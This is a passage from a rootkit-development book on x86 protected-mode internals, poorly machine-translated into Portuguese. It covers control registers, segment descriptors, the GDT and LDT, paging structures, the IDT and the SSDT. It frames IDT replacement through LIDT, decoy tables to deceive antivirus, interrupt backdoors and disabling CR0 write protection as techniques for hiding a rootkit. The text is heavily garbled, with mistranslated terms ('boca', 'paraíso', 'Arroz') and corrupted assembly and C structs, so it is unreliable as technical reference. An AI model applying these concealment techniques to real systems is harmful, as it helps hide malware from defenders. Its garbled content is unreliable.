Antes de passar para a consideração de um tópico muito importante, ou seja,
Memória dependente da memória, você precisa saber o que estou gerenciando
Registas de controle. 
Qualquer processador de 32 bits possui registros de controle CRO, CR1, 
CR2, CR3, CR4.Esses registros contêm bandeiras, alterando o que você pode 
98

pagina: 98

Capítulo 4. Crença com tabelas de sistema 
influenciar o trabalho de todo o processador como um todo.A nomeação de todas essas bandeiras 
Não consideraremos - é dolorosamente cansativo esse processo e desde
o trabalhador da raiz (ou sistema amtícico) a maioria deles nunca 
Nao é útil. 
O mais famoso de todas as bandeiras é o sinalizador do CR0 Register.COM 
Com esta bandeira, o sistema operacional traduz o processador em proteção
O regime.É assim que acontece: 
_Asm 
{ 
Empurre eax 
;Mantemos o valor da eax na pilha 
Mov eax, cro 
;Copie o conteúdo do registro CR0 na EAC. 
ou Al, 
EU. 
;Instale um bit zero 
;(corresponde à bandeira re) em CR0 
Mov cro, eax 
;Traduzimos o processador em modo seguro 
; 
Processador protegido 
;<A primeira instrução a ser concluída 
;No modo protegido>: 
Pop eax 
;Restaurar o valor da eax 
1 
O processador de volta (no modo real) pode ser traduzido usando 
Próximo código: 
_Asm 
{ 
Mover machado, cro 
E Al, 0FEH 
;Abaixamos o pouco de re. 
Mov cro, eax 
;O processador já está no modo real 
} 
4.4.Organização da memória no modo protegido 
Aconselho você a ler esta seção com "um espírito", para que na minha cabeça com certeza 
Toda a imagem do que estava acontecendo foi formada.Se você está cansado, é melhor descansar
Nite de uma hora e continue lendo. 
4.4.1.Introdução a uma organização segmentada de memória 
A primeira coisa que muda ao mudar para um modo seguro é a organização 
memória.No modo protegido, existem dois modelos de organização de memória: 
Segmentação (segmentação) e página (paginação).Até agora vamos falar sobre isso 
Modelos em geral e, em seguida, considere cada modelo com mais detalhes. 
99

pagina: 99

Rootkits 
A segmentação de memória permite separar o espaço do processador alvo 
(a memória que o processador vê) em separado, não -overshooting 
Segmentos, isto é, isolam os programas realizados um do outro. 
O segmento pode conter código, dados, pilha e estruturas do sistema 
Dados (TSS, LDT).Graças à organização do segmento de memória e possível
em multitarefa. 
O modelo de página é mais complexo e volumoso, mas tem muito mais 
oportunidades.É esse modelo que o Windows usa depois de se mudar para 
modo seguro, no qual ela realmente trabalha durante 
tempo todo.Mas até este ponto, na fase inicial do carregamento,
Existe uma organização de segmento de memória.Portanto, primeiro consideramos isso, 
E então passaremos para o modelo da página. 
É interessante que a bandeira no gerenciamento de registros, responsável pelo óbvio
Não há acerto de contas entre os modelos de organização da memória.Digamos 
Então: a segmentação está sempre presente, mas se quisermos usar 
Organização da página, então precisamos instalar o 31º bit (sinalizador PG) 
Registre CR0. 
Dentro da estrutura do modelo de segmento, toda a memória é dividida em grupos de segmentos.você 
Cada grupo tem seu próprio proprietário - um programa.Se houver pro
Um grama tentará recorrer ao segmento de outro programa, processador 
Gerar imediatamente a exceção (interrupção) #GP (Geral Protection, 
Exceção de proteção geral), em resposta à qual o sistema operacional 
Devo concluir o programa de extensão. 
Para entrar em contato com qualquer byte em qualquer segmento de memória, devemos 
Conheça seu endereço lógico.O endereço lógico consiste em um seletor 
(Seletor) e deslocamentos (Offseet).Se você programou o assembler, então 
Já imaginamos que o endereço lógico é apenas um ponteiro distante. 
O seletor nada mais é do que um identificador de segmento exclusivo. 
"Único" significa que cada segmento tem seu próprio esboço
Thor.O deslocamento é o endereço de byte em relação ao início do segmento (seletor). 
Eu acho que tudo é simples aqui.Conhecendo o seletor e o deslocamento, podemos obter
Neel, isto é, Real, Endereço de Memória Bayt. 
OBSERVAÇÃO. 
Agora você precisa esclarecer um ponto.Sabemos que existe um byte de endereço físico 
em mente.Acabamos de aprender que existe um endereço lógico e um endereço linear.E 
Ao mesmo tempo, foi dito que o endereço linear é real, ou seja, físico, 
Endereço da Bayt.Lembre -se - "Endereço linear" e "Endereço físico" - este 
Não sinônimos.Sim, o endereço linear coincide com o endereço físico, mas apenas em 
Caso de endereçamento segmentado, não com base na página! 
100

pagina: 100

Capítulo 4. Crença com tabelas de sistema 
4.4.2.O descritor do segmento 
Já sabemos o que são um seletor e deslocamento, mas precisamos apresentar
Xia com outro termo muito importante - o descritor. 
Antes de recorrer a qualquer endereço de memória, o programa deve
para determinar o conjunto de segmentos pelos quais ela pode "obter" 
esse endereço.O segmento é definido pela estrutura de dados chamada 
Descritor.O tamanho dessa estrutura é de 8 bytes.O descritor contém tudo 
As informações necessárias sobre o segmento.Todos os descritores são armazenados 
Em uma área de memória especial - GDT (Tabela Global Descritor) - Global 
Tabela de descritores (parágrafos 4.4.3). 
A estrutura de descrição de 64 bits é mostrada na FIG.4.1, e na tabela.4.1 Osso
Deno Descrição dos campos de campo. 
63 
56 55 54 53 5;51 
48 47 46 
45 44 43 41 40 39 
16 15 
0 
Endereço, 
Bits 31-24 g d x e 
Limite, 
Bits 19-16 P DPL S tipo A 
Endereço, 
Bits 23-0 
Limite, 
Bits 15-0 
Arroz.4.1.A estrutura do descritor do segmento 
Tabela 4.1.Campos descritores 
Bits 
0-15 
16-31 
32-39 
40 
41-43 
Campo 
Limite, bits 0-15 
Endereço do segmento, bits 
0-15 
Endereço do segmento, bits 
16-23 
Sinalizador A (acessado) 
Tipo de segmento 
Descrição 
O limite do segmento é o valor final da ingestão
niy (offse) no segmento.O campo contém os primeiros 15 bits 
limite 
Endereço do segmento (também conhecido como endereço básico) - 32 categoria
o endereço da área de memória com a qual o SEG
policial.Os primeiros 16 bits do endereço são armazenados neste campo 
Bits 16-23 endereços de segmento 
Acesso a bits.Mostra se foi acessado 
segmento.Se o processador abordou este segmento
Tu para ler ou gravar, então a parte será instalada em 
1. Caso contrário, o bit é 0.
empilhado por um processador, e a operação é descartada
sistema onna.O processador não pode cair o bit. 
Depois de criar um novo bit de segmento A = 0, porque 
Não houve apelos para o segmento 
Um campo de 3 bits.Define o tipo de segmento e 
Direitos de acesso ao segmento (consulte a Tabela 4.2) 
101

pagina: 101

Rootkits 
44 
45.46 
47 
48-51 
52 
53 
54 
55 
56-63 
Sinalizador (sistema) 
Dpl 
Flag P (Pressente) 
Limite, bits 16-19 
Sinalizadores (usuário) 
Flag (reservado) 
Sinalizadores (padrão) 
Bandeira de granularidade (granularidade) 
Endereço do segmento, bits 
24-31 
Indica um objeto de sistema.Se a bandeira for descartada 
(0), então o segmento é sistêmico se estabelecido 
(1), então por segmento comum de código ou dados 
DPL (nível de privilégio do descritor) - Descritor de nível 
privilégios.E este é o número do anel.Este é um dia de dois
O campo total pode conter valores de 0 a 3 
A bandeira da presença do segmento.Se a bandeira estiver instalada, então 
O segmento está em RAM;Se descartado, então 
O segmento é descarregado no disco.Usado para real
Mecanismo de memória virtual 
As demais batalhas do segmento 
Bit de usuário.O processo não é usado
rum.O programa pode instalá -lo em seu deve
Movimento 
Bit respirado.Intel não recomenda
use -o, porque pode ser necessário para
Modelos de processadores soprando 
O tamanho dos operando por padrão.Se a broca for descartada 
(0), então o segmento é de 16 bits.Se instalado (1), então 
O segmento é de 32 bits. 
A granularidade do segmento.Define uma unidade de medição 
segmento.Se a bandeira for descartada, o segmento será medido 
Em bytes, se instalado, então nas páginas (1 página 
= 4 kb) 
Os bits restantes do endereço do segmento 
A tabela a seguir apresenta a decodificação do campo "Tipo de segmento". 
Tabela 4.2.Campo "Tipo de segmento" 
Bit 11 
0 
0 
0 
0 
1 
Bit 10 
0 
0 
1 
1 
0 
Bit 9 
0 
1 
0 
1 
0 
Tipo 
Dados 
Dados 
Dados 
Dados 
Código 
Direitos de acesso 
Somente leitura 
Leitura e gravação 
Apenas lendo, expande 
Leitura e gravação, expande 
Apenas execução 
102

pagina: 102

Capítulo 4. Crença com tabelas de sistema 
1 
1 
1 
0 
1 
1 
1 
0 
1 
Código 
Código 
Código 
Apenas execução 
Apenas execução, acordado (acordo
Segmentos adorados que não consideraremos
vir) 
Execução e leitura, concordou 
4.4.3.Tabelas de descritores 
Se você leu cuidadosamente as duas tabelas anteriores, agora você deve
Entendemos como o sistema determina o tamanho do segmento, o que é medido 
segmento (em bytes ou páginas), como o sistema "entende" que o segmento em
Vai na memória e muito mais.Além disso, acho, deve ficar claro que 
Os segmentos não estão espalhados por toda a memória de uma maneira incompreensível - afinal, cada um
O segmento tem seu próprio endereço.Lembre -se de uma coisa: todas as informações sobre o segmento 
Armazene no descritor. 
O próprio descritor pode estar em três tabelas: 
• 
GDT (Tabela Global Descritor) - uma tabela global de deskricop; 
• 
LDT (tabela de descritor local) - Tabela de descritores local; 
• 
IDT (tabela de descritores de interrupção) - Tabela de descritores de prere
Vanius. 
Todas essas tabelas estão em RAM.Sua formação 
O sistema operacional está envolvido, não o processador.Neste parágrafo, corremos
Olhamos para as duas primeiras mesas e, sobre a terceira tabela, teremos um separado 
falar. 
MESA 
G d t 
Cada sistema operacional tem uma tabela de GDT acessível a todos 
processos.Todos eles se voltam para ela para a resolução do necessário 
Endereços de memória. 
103

pagina: 103

Rootkits
Na memória GDT, é organizada linearmente, e não na forma de um segmento.O começo da mesa
Armazenado no registro GDTR.GDTR é o mesmo registro que Eax, EIP,
Somente ele armazena dados não arbitrários, mas sempre o mesmo número - endereço
O início do GDT.
O registro GDTR 48 -BIT: 32 bits são ocupados por um endereço básico linear e 16 -
O limite da tabela (seu tamanho máximo + 1 byte).Se o limite for igual a,
Que na verdade o GDTR ocupa 1 byte na memória.Se o limite for n, então
O tamanho do GDTR na memória é n+1 byte.
Para gravar/ler o valor do registro GDTR são comandos
LGDT/SGDT por padrão (imediatamente após ligar ou frio
Cargas) A base do GDT é 0 e o limite é FFFFH.
Agora vamos fazer aritmética.Sabemos que o descritor toma
Sofre 8 bytes.Ao dividir o FFFF por 8, obtemos 8191 descritor.Acontece que, em
A tabela GDT pode ser armazenada 8192 descritores (um é reservado para
Zero, a numeração começa com 0).O primeiro descritor no GDT é chamado
É "Zero Descritor" e não é usado.Ao abordar isso
O processador descritor gera #GP.
Tabela LDT
Tabela local de descritores refere -se a um processo e não
É obrigatório.Pode estar ausente.Ao mesmo tempo vários
para processos pode usar o mesmo LDT
Ao contrário do GDT, o LDT é um segmento.Como LDT é um segmento,
Deve ser o descritor dela em algum lugar.É isso mesmo, é armazenado no GDT
A tabela LDT, como o GDT, tem seu próprio registro - LDTR.Ele contém
a informação a seguir:
•
Seletor de segmento - 16 bits;
•
Endereço básico linear - 32 bits;
•
O limite do segmento é de 16 bits.
Para gravação/leitura, os valores deste registro são comandos LLDT e SLDT
Quando a energia é ligada (recarregamento a frio) o campo de endereço no LDTR
Está instalado em 0 e o limite no FFFFH.
Para identificação do segmento, é usada uma estrutura de dados de 16 bits,
que é chamado de seletor.O seletor é armazenado em regis segmentados
Tra cs.O seletor não indica o próprio segmento de memória, mas seu descritor
Na tabela de deskriptors.
104

pagina: 104

Capítulo 4. Crença com tabelas de sistema 
Como o processador forma o endereço?O seguinte endereço de instrução é
Beba em um par de registros CS: EIP.Este é um endereço abstrato no qual
É para calcular o linear.No campo, o "índice" registra o templo CS (bits 0-15)
O seletor é, ou seja, a posição do descritor do segmento desejado na tabela 
Descritores.Neste descritor, o processador encontra o endereço da base do segmento, 
Dobre -o com o valor de EIP e recebe o endereço linear das instruções em 
Memória (eu lembro que com uma organização de segmento de memória, um endereço linear 
coincide com o físico).O esquema de cálculo do endereço linear das instruções 
Mostrado na FIG.4.2. 
CS Register, 
Campo "ÍNDICE 
(lógico 
endereço) 
Eip 
Seletor 
Viés 
Tabela de descritores 
Descritor 
Endereço base *® 
Endereço linear 
Arroz.4.2.Transformação do endereço lógico em linear 
Repetimos mais uma vez: um seletor é extraído do CS.Pelo seletor, encontramos a necessidade
O descritor na tabela do descritor.O descritor contém todas as informações
A esteira do segmento, incluindo o endereço básico.Dobre o endereço básico 
E o deslocamento que é armazenado no EIP, e temos um endereço linear.Pensar, 
Tudo não é muito difícil aqui, certo? 
Agora temos todos os motivos para ir para o próximo modelo de endereço
Memória da memória - para o endereço da página. 
4.4.4.Sortia abordando 
Sabemos que existem dois tipos de abordagem - segmento e página. 
Acabamos de descobrir o segmento.Também foi dito como você pode 
Alterne para o endereço da página. 
Em princípio, não precisamos saber disso - afinal, ele está envolvido em mudar 
sistema operacional.Mas há um ponto interessante.Inicialmente 
105

pagina: 105

Rootkits 
O sistema operacional muda para um modo seguro.Por isso, 
O tipo de endereço é segmentado.Salas de operações mais modernas 
Os sistemas usam o endereçamento da página, portanto, após a troca 
Em um modo seguro, o sistema operacional muda para a página 
Endereçando memória. 
Surge a questão: para onde vai o endereço segmentado, mais precisamente
Tours?Portanto, todas as estruturas do endereço segmentado permanecem em seus 
lugares.A única coisa que o endereço da página se reflete é 
transferência de um endereço linear para físico.Afinal, com o endereço segmentado 
O endereço linear coincide com o físico, mas com o endereço da página 
A situação é um pouco diferente.Temos que lidar com isso. 
Para perceber tudo, precisamos lembrar o que é lógico, 
Endereços lineares e físicos.O endereço lógico é um endereço abstrato. 
Ele não nos diz nada.Em CS: EIP, é o endereço lógico que é armazenado. 
Quando processarmos esse endereço - extrair um seletor, descobriremos por ele 
Descritor, etc. - Só então aprenderemos o endereço linear. 
Se tivermos abordagem segmentada, o mesmo endereço é físico. 
O endereço físico pode ser enviado imediatamente para o endereço do endereço sem qualquer 
Transformações.Isso significa que, com o endereçamento do segmento, o processador
É o endereço linear para o pneu de endereço. 
No caso de endereçamento da página, o endereço linear não coincide com o físico
o mesmo.Estamos lidando com a memória virtual.O processador divide tudo direcionado 
espaço para páginas de tamanho fixo - 4 kb, 2 Mb ou 
4 MB.As páginas, por sua vez, são exibidas na memória física ou 
Armazenado no disco.O programa (processo) funciona com endereços lógicos, 
O processador traduz os endereços em linear e depois para os físicos.Se o país
NITs com um endereço físico não estão na memória RAM (física), 
Depois, há uma exceção #pf (falha na página). 
O manipulador de exclusão #pf deve corrigir rapidamente a situação 
- afogue a página que faltava no disco rígido.Se para sub-
A carga não é suficiente para a RAM, ela deve descarregar desnecessário 
(não usado no momento) Página para o disco e em seu lugar a carga
A página necessária no momento.O carregamento é feito de 
áreas de inchaço.No Windows, este é um arquivo de troca (arquivo de giro), no Linux 
A área de balanço pode ser uma seção de balanço, ou talvez o usual 
Arquivo de troca. 
Descobrimos isso, agora estamos seguindo em frente.Outra página endereçando 
difere do segmento em que todas as páginas têm um tamanho fixo, 
que é selecionado com antecedência.Mas os tamanhos do segmento podem mudar. 
106

pagina: 106

Capítulo 4. Crença com tabelas de sistema
A próxima diferença é que a página endereçando
O uso do mecanismo de memória virtual é zero.Segmentos em
O endereço segmentado está sempre em memória física e páginas
pode ser tanto na RAM física quanto no arquivo de swing
No disco rígido.Observação: a maior parte do trabalho "sujo" em
A transformação de endereços e o cache das páginas é realizada pelo próprio processador,
não o sistema operacional.
Digamos, a propósito, algumas palavras sobre o cache de páginas.Páginas, K.
que o processador é abordado, armazenando em cache em um buffer com a associativa
Amostra (TLB - Table Lookaside Buffer).Mais precisamente, no buffer, eles são preservados
não completamente páginas, mas as informações necessárias para o operacional antes
Estupa para eles.O buffer em si está no processador.
Para você, como desenvolvedor de Rutkita, você precisa saber que no TLB você pode
Mude algo se precisar.Para mudar a TLB serve
Instrução Invlpg, que pode ser realizada apenas no anel zero.
Não vamos nos debruçar sobre isso em detalhes - quando você precisar
Esta instrução, você não precisará mais deste livro.
Diretamente no processador, a organização da página é controlada por três
bandeiras:
•
A bandeira PG (PAGING) é o 31º bit do registro CR0 (apareceu pela primeira vez em
Processador 80386).Permite endereços de página.Desculpe
O endereço é ativado imediatamente após a instalação deste sinalizador em 1.
•
PSE Flag (Extensões de tamanho da página) é o quarto bit do registro CR4 (pela primeira vez
apareceu em Pentium).Se você instalar esta bandeira, o processador irá
operar com páginas de tamanho expandido (2 ou 4 MB);Se
A bandeira é descartada (0), o tamanho da página é de 4 kb.
•
Extensão de endereço físico - 5º bit no registro CR4
(Pentium Pro).Permite expandir o endereço físico para 36 bits
(que esqueceu - por endereço padrão 32 -bit).A bandeira pode ser uma boca
Bom apenas no modo de endereçamento da página.
Você provavelmente já tem uma ideia se um depurador for detectado ou
Os programas de detecção de Rutkita lançam a bandeira PG ...
4.4.5.Catálogos e tabelas de página
Estruturas de dados que controlam o endereço da página
No endereçamento segmentado, lidamos com as tabelas descritores.Para o país
Novo endereço apareceu novas estruturas de dados:
107

pagina: 107

Rootkits 
• 
Catálogo de páginas (diretório de página) - Uma matriz de entradas de 32 bits 
PDE (entrada do diretório de página).O catálogo de páginas é armazenado na página 
Tamanho 4 KB.Daqui você pode calcular a quantidade máxima 
Registros PDE: 4 096 (4 kb) / 4 (32 bits) = 1024 registros. 
• 
Tabela de página (tabela de página) - Uma matriz de 32 entradas de bits da boca 
(Entrada da tabela de página).Também é armazenado em uma página de 4 kilobytes. 
Como você já calculou, nesta tabela 1024 registros.Se 
As dimensões das páginas são expandidas, ou seja, 2 ou 4 MB, depois a tabela 
Páginas não são usadas.Nesse caso, apenas Kata é usado
Páginas de log. 
• 
Página (página) - Uma área de memória de 4 kb, 2 Mb ou 4 Mb. 
• 
Indicador de catálogo de páginas - uma matriz de sinais de 64 bits, 
Cada um dos quais indica o catálogo de páginas.Esta estrutura 
Usado apenas no modo param (para endereçamento de 36 bits). 
Agora vamos descobrir o que está lá.Com a página é clara - esta é a estrutura principal
Tour com o endereço da página.Catálogo e mesa de página são usados 
Quando transmitir endereços.Se estamos no modo PSE (no modo expandido 
Páginas), então apenas o catálogo de páginas é usado para transmitir endereços. 
O envenenamento por catálogo de páginas é usado apenas para endereços de 36 bits 
(no paraiso). 
Considere o que certos sinalizadores afetam (Tabela 4.3). 
Tabela 4.3.O efeito das bandeiras no tamanho das páginas e na descarga do físico 
Endereços 
PG (CRO) 
0 
Paraíso 
(CR4) 
-
0 
0 
0 
0 
1 
1 
Pse 
(CR4) 
-
0 
1 
1 
1 
-
-
PSE-36 
-
-
-
0 
1 
-
-
PS (PDE) 
-
-
0 
1 
1 
0 
1 
País
Nitsa 
-
4 kb 
4 kb 
4 MB 
4 MB 
4 kb 
2 MB 
Endereço 
(pedaço) 
-
32 
32 
32 
36 
36 
36 
Cálculo do endereço físico 
Com endereçamento de página, os três mais populares
abordando a maneira: 
108

pagina: 108

Capítulo 4. Crença com tabelas de sistema 
• 
Endereço comum de 32 bits (página 4 KB); 
• 
Endereçamento de 36 bits usando uma bandeira do paraíso (tamanho 
Páginas 4 kb); 
• 
Endereçamento de 36 bits usando o sinalizador PSE (expandido
tamanho da página). 
Considere o endereço linear mais simples de 32 bits 
(O tamanho da página é de 4 kb). 
A tarefa é a seguinte: obter um endereço físico em um endereço linear. 
O endereço linear consiste no índice de catálogo de páginas, o índice de tabela 
páginas e deslocamentos, ou seja, a localização real do byte endereçado 
Na página (Fig. 4.3). 
Endereço linear 
31 
22 21 
12 11 
SOBRE 
Índice de catálogo 
Índice de tabela 
Viés 
Arroz.4.3.A estrutura do endereço linear 
A página é o seguinte algoritmo: 
• 
No registro CR3, o endereço básico do catálogo de páginas está localizado; 
• 
O índice de catálogo de páginas é extraído do endereço linear; 
• 
Uma gravação de PDE é extraída do catálogo de páginas; 
• 
Segundo o PDE, a entrada correspondente a ela é um registro; 
• 
De acordo com o índice da tabela de catálogo (média de 10 bits do endereço linear) 
A própria página é determinada; 
• 
Já calculamos o endereço da página.Resta encontrar o byte de endereço 
Memória - isso é feito com a ajuda de um deslocamento, o que indica o ponto
Um local de byte na página. 
Deixe -me lembrá -lo de que, se a página não for procurada na memória física, o processador 
gera a exclusão de #pf e o identificador desta exceção carregam 
A página desejada da área de natação. 
Transmissão do endereço no caso de páginas estendidas (2 e 4 MB) um pouco 
É simplificado devido ao fato de a tabela de páginas não ser usada.Linear 
O endereço neste caso consiste em apenas duas partes - o índice de catálogo e SMO
nomes.O restante do princípio é o mesmo: a base do catálogo é extraída do CR3 
109

pagina: 109

Rootkits 
Páginas, o registro de PDE desejado está no índice de catálogo,
A página é, e o endereço final do objeto é determinado devido ao deslocamento 
(Rice 4.5). 
31 
Endereço linear 
22 21 
12 11 
S 
P 
" 
Catálogo de páginas 
Registro do catálogo 
E*GUCH 
J. 
Registro da tabela 
* 
Página (4 kb) 
Endereço físico 
Arroz.4.4.O algoritmo para encontrar a página de memória (endereço linear 
transmissão) 
Endereço linear 
31 
22 21 
Índice de catálogo 
Viés 
EU - 
Catálogo de páginas 
Registro do catálogo 
CR3 
Página de 4 MB 
Endereço físico 
D. 
Arroz.4.5.Transmissão de endereço linear (tamanho da página 4 MB) 
PDE Records e 
Boca 
Se você ainda não se esqueceu, os registros do PDE consistem em um catálogo de páginas, e 
A partir dos registros da boca -tabela de páginas.Considere as estruturas dos elementos 
PDE e boca. 
110

pagina: 110

Capítulo 4. Crença com tabelas de sistema 
PDE: 
31 
12 11 
9 8 7 6 5 4 3 2 1 0 
Endereço base da página 
G p 
S d a com 
D. 
R 
C. 
T 
E 
/ 
S. 
n 
/ 
W p 
Boca: 
31 
12 11 
9 8 7 6 5 4 3 2 1 0 
O endereço da base da página 
G • 
D a 
R 
COM 
D. 
R 
C. 
T 
E 
/ 
S. 
R 
W p 
Arroz.4.6.Estrutura de elementos de PDE e boca 
No campo do endereço do endereço, o endereço base da tabela de páginas é armazenado. 
O objetivo de outros campos é fornecido na tabela.4.4. 
Tabela 4.4.Records de PDE e boca 
Campo 
Campo sem 
Nomes 
G 
Ps 
Pat 
D. 
A 
Encontro 
Disponível para o programador e pode ser usado a seu critério 
A bandeira do global.Apareceu pela primeira vez nos processadores Pentium Pro.Se 
Este sinalizador está definido, a página é global.Se a página for Glim
Ballroom e bandeira PGE no registro CR4, depois o país correspondente
Bons elementos do catálogo e da tabela de páginas nunca serão removidos de 
cache tlb.Normalmente páginas globais contendo código central 
E a estrutura do núcleo 
Tamanho da página.Se a bandeira for descartada (0), o tamanho da página é 4 
KB, elemento do catálogo de páginas indica uma tabela de página.Se a bandeira 
Conjunto (1), a página tem um tamanho de 4 MB (em endereço de 32 bitantes
ção) ou 2 Mb (se usado), o elemento do catálogo de páginas indicou
a própria página, já que a tabela de páginas não é usada 
Índice de Atributo da Página.Pat (tabela de atributo de página) é a tabela
CA, expandindo a arquitetura IA-32.Refere -se a registros MTRR.Para nós 
Não é muito importante, por isso não vamos nos aprofundar.Se você é
Resno, então essa bandeira é relativamente jovem - apareceu pela primeira vez no Pentium 
Iii (também está em Piv e Cheoop), em processadores mais "antigos" desta bandeira 
Sempre igual a 0 
"Dirty" (sujo) Bit.Mostra se a página foi feita na página. 
Se as páginas de 4 kb forem usadas, este bit será ignorado 
Acesso a bits.Ele é instalado ao acessar a página.Se a parte for igual 
0, isso significa que não havia acesso à página desde o momento em que é carregado em 
memória.Este bit é instalado pelo próprio processador 
111

pagina: 111

Rootkits 
Tabela 4.4.Entradas de PDE e boca (continuação) 
Campo 
PCD 
Pwt 
Nós 
R/w. 
R 
Encontro 
Bandeira de proibição de armazenamento em cache.Se esta bandeira estiver instalada, então cache 
Esta página é proibida;Se você caiu (0), a página pode ser cache-
Rive 
Sinalizador de gravação grátis.Se a bandeira estiver instalada, é permitido 
Através da gravação (um dos tipos de cache).A bandeira é ignorada se o bigode
A bandeira do PCD foi colocada (proibição de cache) 
O sinalizador define os privilégios do usuário/supervisor.Se a bandeira for descartada, 
A página está disponível apenas para o supervisor, se instalado, então a página antes
O pé para o usuário e supervisor 
Sinalizador de controle de leitura/gravação.Se descartado, a página está disponível 
Somente para leitura, se instalado, a página está disponível como para leitura, 
e para gravação 
Bandeira de presença.Se instalado (1), a página está na operação
Memória, se descartada, a página deve ser carregada da região em
arremesso 
4.5.Tabela de transcriptores de interrupções (yut) 
Já mencionamos esta tabela, agora falaremos sobre isso com mais detalhes.Mesa 
IDT (tabela de descritores de interrupção) é usada para controlar o processo
Chiks de interrupções. 
Interrupção é um evento que ocorre no sistema e exigindo que ele intervenha
Tel.Por exemplo, uma tecla de teclado foi pressionada, um sinal foi obtido 
Do modem ou algum tipo de erro (divisão por 0, saída 
fora do intervalo, transbordar do buffer).Interrupções são Appa
Militar (IRQ - Solicitação de interrupção) ou software (interrupção). 
As interrupções de hardware são iniciadas por "ferro" e software - sobre
Suporte de Gram.

pagina: 112

Capítulo 4. Crença com tabelas de sistema
Na tabela IDT 256 - uma para cada interrupção de software para cada
Nia.Imagine o que é armazenado no IDT é fácil: endereços de manipuladores pré
Dormação e todos os tipos de informações adicionais.Processador pré
Rasgar é um subprograma regular (função), às vezes também é chamado
Vetor de interrupção - vetor de interrupção.Assim que uma interrupção
O processador procura na tabela IDT o endereço do processamento correspondente
Interrupção Chika, mantém o endereço de retorno ao programa, sinalizadores de processador
e transferências controlam o processador de interrupção - vai para o especificado
O endereço é endereço.
Se você tem vários processadores, terá várias tabelas IDT - por
um para cada processador.Consequentemente, cada tabela IDT será
consistem em 256 registros.
O endereço da tabela é armazenado no registro IDTR.Para alterar o endereço da guia
Interrupções que você pode usar a instrução Lidt (Carregar IDT).
A tabela IDT é muito importante para nós.Agora vou explicar o porquê.Rutkin pode
Crie uma nova tabela de interrupção e usando as instruções de download da LIDT
Marque seu endereço no IDTR.Isso ocultará a substituição da tabela original
interrupções.Obviamente, o antivírus pode verificar a integridade do inicial
IDT, mas o Rutkit pode criar uma cópia do IDT de origem, baixar seu endereço em
Idtr, que permitirá que ele passasse despercebido.
Manipulando interrupções, você pode controlar completamente
Sistema - Afinal, você pode instalar manipuladores para todos os sistemas com
Ser.Você pode ter duas tabelas de interrupção - uma para o processador,
E o outro é especificamente para a apresentação do antivírus, o que permitirá
Enganar.
Você pode ler o valor IDTR usando as instruções SIDT (Store IDT).
Esta instrução retorna o valor do IDTR no seguinte formato:
Typedef struct
{
Idtlimit curto não assinado;
Não assinado curto lowidtbase;
Hildtbase curta não assinada;
} Idtinfo;
Já sabemos que a tabela IDT pode ter 256 registros (para interrupções
Com números de 0 a 255).O formato desses registros é o seguinte:
• PAGMA PACK (L)
Typedef struct
{
UNSIGNED LEWFOFFSET DE LOUTA;
Seletor curto não assinado;
113

pagina: 113

Rootkits 
Char não assinado unus_lo; 
Não assinado • Char segment_type: 4; 
CHAR não assinado System_segment_flag: 
1; 
Char não assinado dpl: 2; 
// Nível de privilégio do descritor 
// descritor do nível de privilégios 
Char não assinado P: L; 
// Pressente - Flag de presença 
HiOffset curto não assinado; 
} Idtentry; 
#Pragma pack 
Essa estrutura de dados, às vezes chamada de gateway de interrupção (interrompa 
Portão), serve para procurar um manipulador de interrupção.Usando um gateway,
grama de nível de usuário pode causar subprogramas de nível 
Núcleos. 
Você provavelmente já adivinhou como podemos usá -lo em nosso
Lyakh?Interrupções adicionais podem ser usadas por Rutkin 
Como backdoor.Mas, por enquanto, não há prática.No próximo capítulo nós 
Mostraremos como exibir a tabela IDT para o console, mas até agora não o temos para isso 
ferramentas. 
4.6.Estrutura SSDT 
Tabela de distribuição de serviço do sistema (SSDT, serviço do sistema 
Tabela de expedição) é usada para procurar as funções necessárias para
Servindo esta ou aquela chamada do sistema.Esta tabela se forma 
sistema operacional, não um processador. 
Existem duas maneiras de fazer uma chamada de sistema: por interrupção 
0x2e ou usando as instruções do Sysenter - isso é duas vezes
uma maneira de levar ao mesmo resultado.No Windows XP 
Sysenter é usado, enquanto em outras plataformas usando
Há uma interrupção de 0x2 E. 
Detalhes sobre como mudar esta tabela de acordo com as necessidades 
Falaremos no próximo capítulo. 
4.7.Limitando o acesso a algumas tabelas importantes 
Windows XP (e Windows 2003) permite limitar o acesso a tabelas 
SSDT e IDT.Depois que as restrições são ativadas, essas duas tabelas acessarão
Somos apenas para leitura, o que não permitirá que Rutkin os mude.Limitação 
As seguintes chaves são indicadas no registro do sistema: 
114

pagina: 114

Capítulo 4. Crença com tabelas de sistema 
H k l m \ s s t e m \ c r r e n t c o n t r o t \ c o n t r o s i o n 
Gerente \ 
Gerenciamento de memória \ EnforceWriteProtection 
= Sobre 
Hklm \ System \ Cu R E N T C O N T R O T T \ C O N T R O 1 \ S S I O N 
Gerente \ 
Gerenciamento de memória \ desabillePagingExecutive 
= 1 
Se essas chaves (ou uma) não existem, crie -as.Deve ser observado
Tit que este método não dá uma garantia 100% de que SSDT e IDT não são Boo
Dut é alterado.Se Rutkin agir diretamente, ele, manipulando bandeiras 
O registro CR0 pode desativar essas restrições.Mas ainda assim um Zaystan 
Melhor do que de tudo. 
4.8.As funções mais importantes do sistema operacional 
O componente principal de qualquer sistema operacional é o núcleo.Qualquer núcleo 
Qualquer sistema operacional deve executar determinadas funções, 
que dependem do próprio sistema operacional, mas para nós agora são importantes 
As duas funções principais a seguir: 
• 
Fornecendo acesso de software ao hardware 
Significa.O núcleo controla o acesso dos programas ao arquivo "ferro" - 
sistema, interfaces de rede, memória, teclado, mouse, monitor 
etc. 
• 
Depuração e diagnóstico do próprio sistema.O sistema operacional deve 
fornecer aos programas informações sobre o sistema - sobre dispositivos, sobre 
Programas instalados, sobre processos avançados, etc. 
Para acessar o dispositivo ou obter informações sobre o sistema
Eu, o programa precisa fazer uma solicitação - entre em contato com o núcleo da sala de operações 
sistemas.Como regra, para isso, o sistema operacional fornece especial
Funções cyal.Todas essas funções formam uma interface aplicada 
Programação - API (interface de programação de aplicativos).Programa 
causa uma função de API que retorna o sistema de informação desejado
ção.DOS também tinha funções de API - eles foram chamados através da interrupção 
INT21H. 
Você sempre pode escrever um programa que possa "se locomover" da sala de operações 
o sistema usando meios de acesso não documentados ou diretos 
dispositivos (por exemplo, memória).Apesar do fato de quase sempre ser possível 
Vá "It -Pass", muitos programadores não fazem isso.Programação 
No Windows em um nível baixo, é como escrever janelas novamente. 
Introdução ao sistema operacional é uma lição bastante complicada e longa.Ir
É mais fácil usar fundos que a sala de operações oferece 
115

pagina: 115

Rootkits
sistema.Além disso, esses fundos estão perfeitamente documentados e você não está
